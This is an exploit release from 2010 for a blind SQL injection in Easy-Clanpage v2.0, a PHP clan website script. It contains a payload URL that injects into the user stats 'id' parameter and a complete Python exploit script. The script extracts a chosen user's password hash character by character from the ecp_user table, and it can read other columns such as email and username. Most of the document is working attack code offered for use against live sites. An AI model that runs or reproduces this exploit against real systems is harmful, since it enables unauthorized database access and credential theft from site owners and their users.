----------------------------Information------------------------------------------------
+Name : Easy-Clanpage <= v2.0 Blind SQL Injection Exploit
+Autor : Easy Laster
+Date   : 24.03.2010
+Script  : Easy-Clanpage v2.0
+Download : http://www.easy-clanpage.de/?section=downloads&action=viewdl&id=12
+Demo : http://capu87.ca.funpic.de/
+Price : for free
+Language : PHP
+Discovered by Easy Laster
+Security Group 4004-Security-Project
+Greetz to Team-Internet ,Underground Agents
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr Chaos,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne.
 
---------------------------------------------------------------------------------------
                                                                                      
 ___ ___ ___ ___                         _ _           _____           _         _  
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_| 
                                              |___|                 |___|           
 
 
----------------------------------------------------------------------------------------
+Vulnerability : http://localhost/ecp_version2/?section=user&action=details&func=stats&id=
 
#BLind SQL Injection
+Exploitable   : http://localhost/ecp_version2/?section=user&action=details&func=stats&id=
1+and+1=1+and+ascii(substring((SELECT password FROM ecp_user+WHERE+userID=1 LIMIT 0,1),1,1))>1
-----------------------------------------------------------------------------------------
#Blind SQL Injection Exploit
 
#!/usr/bin/env python
#-*- coding:utf-8 -*-
import sys, urllib2, getopt
 
def out(str):
    sys.stdout.write(str)
    sys.stdout.flush()
 
class Exploit:
    charset = "0123456789abcdefABCDEF"
    url = ""
    charn = 1
    id = 1
    table_prefix = ""
    table_field = ""
    passwd = ""
    columns = []
    find_passwd = True
 
    def __init__(self):
        if len(sys.argv) < 2:
            print "*****************************************************************************"
            print "******************** Easy-Clanpage V2.0 Profil Page Hack ********************"
            print "*****************************************************************************"
            print "*                Discovered and vulnerability by Easy Laster                *"
            print "*                             coded by Dr.ChAoS                             *"
            print "*****************************************************************************"
            print "* Usage:                                                                    *"
            print "* python exploit.py [OPTION...] [SWITCH...] <url>                           *"
            print "*                                                                           *"
            print "* Example:                                                                  *"
            print "*                                                                           *"
            print "* Get the password of the user with id 2:                                   *"
            print "* python exploit.py -id 2 http://site.de/ecp/                               *"
            print "*                                                                           *"
            print "* Get email and username of id 1:                                           *"
            print "* python exploit.py -columns 80:email,25:username -nopw http://site.de/ecp/ *"
            print "*                                                                           *"
            print "* Switches:                                                                 *"
            print "* --nopw                                  Search no password                *"
            print "*                                                                           *"
            print "* Options:                                                                  *"
            print "* --id=<user id>                          User id                           *"
            print "* --prefix=<table prefix>                 Table prefix of ECP               *"
            print "* --columns=<max_chars:column_name,...>   Get value of any column you want  *"
            print "*****************************************************************************"
            exit()
        opts, switches = getopt.getopt(sys.argv[1:], "", ["id=", "prefix=", "columns=", "nopw"])
        for opt in opts:
            if opt[0] == "--id":
                self.id = int(opt[1])
            elif opt[0] == "--prefix":
                self.table_prefix = opt[1]
            elif opt[0] == "--columns":
                for col in opt[1].split(","):
                    max, name = col.split(":")
                    self.columns.append([max, name, ""])
            elif opt[0] == "--nopw":
                self.find_passwd = False
        for switch in switches:
            if switch[:4] == "http":
                if switch[-1:] == "/":
                    self.url = switch
                else:
                    self.url = switch + "/"
    def generate_url(self, ascii):
        return self.url + "index.php?section=user&action=details&func=stats&id=1+and+1=1+and+ascii(substring((SELECT%20" + self.table_field + "%20FROM%20" + self.table_prefix + "ecp_user%20WHERE%20userID=" + str(self.id) + "%20LIMIT%200,1)," + str(self.charn) + ",1))%3E" + str(ord(ascii))
    def start(self):
        print "Exploiting..."
        if self.find_passwd:
            self.password()
        if len(self.columns) > 0:
            self.read_columns()
        print "All finished!\n"
        print "------ Results ------"
        if len(self.columns) > 0:
            for v in self.columns:
                print "Column \"" + v[1] + "\": " + v[2]
        if self.find_passwd:
            if len(self.passwd) == 32:
                print "Password: " + self.passwd
            else:
                print "Password not found!"
        print "--------------------"
    def read_columns(self):
        end = False
        charrange = [0]
        charrange.extend(range(32, 256))
        for i in range(len(self.columns)):
            out("Getting value of \"" + self.columns[i][1] + "\": ")
            self.table_field = self.columns[i][1]
            for pwc in range(1, int(self.columns[i][0]) + 1):
                if end == True:
                    break
                self.charn = pwc
                end = False
                for c in charrange:
                    src = urllib2.urlopen(self.generate_url(chr(c))).read()
                    if "<b>Warning</b>:  mysql_result() [" in src:
                        if c == 0:
                            end = True
                        else:
                            self.columns[i][2] += chr(c)
                            out(chr(c))
                        break
            out("\n")
    def password(self):
        out("Getting password: ")
        self.table_field = "password"
        for pwc in range(1, 33):
            self.charn = pwc
            for c in self.charset:
                src = urllib2.urlopen(self.generate_url(c)).read()
                if "<b>Warning</b>:  mysql_result() [" in src:
                    self.passwd += c
                    out(c)
                    break
        out("\n")
 
exploit = Exploit()
exploit.start()